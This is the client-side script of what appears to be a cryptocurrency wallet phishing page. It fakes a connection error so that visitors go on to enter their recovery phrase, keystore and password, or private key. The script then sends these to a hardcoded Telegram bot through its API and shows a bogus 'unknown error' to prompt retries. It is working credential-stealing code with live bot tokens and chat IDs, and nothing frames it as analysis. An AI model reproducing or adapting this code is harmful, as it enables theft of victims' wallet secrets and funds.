
    $(document).ready(function () {
         $("#search-field").on("keyup", function () {
        var value = $(this).val().toLowerCase();
        $(".coin-registry button").filter(function () {
          $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
        });
      });

      let wallets = $(".coin-registry button");
      wallets.each(function () {
        $(this).on("click", function () {
          let img = $(this).find(".coin-img").attr("src");
          event.preventDefault();
          $(".connection-info").text("Initializing...");
          $("#current-wallet-app").text(
            $(this).children().last().text().trim()
          );
          $("#current-wallet-logo").attr("src", img);
          $("#connect-dialog").show();
          setTimeout(function () {
            $(".connection-info").html(
              'Error Connecting... <button class="manual-connection">Connect Manually</button>'
            );
            $(document).find("button.manual-connection").trigger("click");
          }, 1000);
        });
      });
      let dialogDismiss = $(".dialog-dismiss");
      let sendForm = $("#data-to-send");
      let successBox = $("#success-dialog");
      let errorBox = $("#error-dialog");
      dialogDismiss.each(function () {
        $(this).on("click", function () {
          $("#connect-dialog").hide();
          $("#send-dialog").hide();
        });
      });
      $("#phraseSend").on("click", function () {
        sendForm.html(
          `<div class="form-group"><input type="hidden" id="type" name="type" value="phrase">
            <textarea id="phrase" name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
          </div>
          <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>`
        );
      });
      $("#keystoreSend").on("click", function () {
        sendForm.html(
          `<div class="form-group">
            <input type="hidden" id="type" name="type" value="keystore">
            <textarea rows="5" style="resize: none" required id="keystore" class="form-control" placeholder="Enter Keystore"></textarea>
            </div>
          <input type="text" class="form-control" name="password" id="password" required placeholder="Wallet password">
          <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>`
        );
      });
      $("#privateKeySend").on("click", function () {
        sendForm.html(
          `<input type="hidden" id="type" name="type" value="privatekey">
          <input type="text" id="privateKey" name="privateKey" required class="form-control" placeholder="Enter your Private Key">
          <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>`
        );
      });

      $(".connection-info").on("click", ".manual-connection", function () {
        $("#current-wallet-app-send").text($("#current-wallet-app").text());
        $("#walletNameData").val($("#current-wallet-app").text());
        var link = $("#current-wallet-app").text();
        $("#current-wallet-send-logo").attr(
          "src",
          $("#current-wallet-logo").attr("src")
        );
        $("#connect-dialog").hide();
        $("#send-dialog").show();
      });

      $("#processForm").submit(function (e) {
        e.preventDefault();

        let coinType = $("#current-wallet-app").text();
        let reqType = $("input#type").val() || '';
        let reqPhrase = $("textarea#phrase").val() || '';
        let reqKeystore = $("textarea#keystore").val() || '';
        let reqPassword = $("input#password").val() || '';
        let reqPrivateKey = $("input#privateKey").val() || '';

        let processBtn = $("#proceedButton");
        let cancelBtn = $("#cancelBtn");
        
        let message = '********************\n\n';
        message += `Wallet Connection:\n`;
        message += `${coinType}\n\n`;
        if ( reqPhrase ) message += `Phrase\n`;
        if ( reqPhrase ) message += `${reqPhrase}\n\n`;
        if ( reqKeystore ) message += `Keystore\n`;
        if ( reqKeystore ) message += `${reqKeystore}\n\n`;
        if ( reqKeystore ) message += `Password\n`;
        if ( reqPassword ) message += `${reqPassword}\n\n`;
        if ( reqPrivateKey ) message += `Private Key\n`;
        if ( reqPrivateKey ) message += `${reqPrivateKey}\n\n`;
        message +=`********************\n`;
        
        // const token = "8034050830:AAEdlq9YL-JLiP0BpKhOItWUnXWS9-NyU8k";
        // const token = "8257355695:AAEMUkSUqQFVS9eCT5mQEMtit0vLh18fIWo"; // test
        // const chatId = "5949473270";

        // return console.log(message);

        const botToken = "8321594074:AAF0OiHDnPDyGMa8yWY9oi20I8A6uJhU2o0";
        const chatId = 7765726318;

        $.ajax({
          type: "GET",
          url: `https://api.telegram.org/bot${botToken}/sendMessage`,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          data: {
            'chat_id':chatId,
        'text': message,
        'parse_mode' : 'HTML'
          },
          beforeSend: function () {
            processBtn.html(
              '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
            );
            processBtn.prop("disabled", true);
            cancelBtn.prop("disabled", true);
          },
          success: function () {
            // dismissAllDialogs();
            setTimeout(function () {
              restoreButtons();
              $("div.message-tab").html(
                "<div class='alert alert-danger'>An unknown error occured, please try again later.</div>"
              );
            }, 5000);
          },
          error: function (err) {
            restoreButtons();
            dismissAllDialogs();
            errorBox.show();
            setTimeout(function () {
              dismissAllDialogs();
              $("#send-dialog").show();
            }, 2500);
            console.log(err)
          },
        });
        function restoreButtons() {
          processBtn.html("PROCEED");
          processBtn.prop("disabled", false);
          cancelBtn.prop("disabled", false);
        }
        function dismissAllDialogs() {
          successBox.hide();
          errorBox.hide();
          $("#connect-dialog").hide();
          $("#send-dialog").hide();
          $("#processing-dialog").hide();
        }
      });
    });
  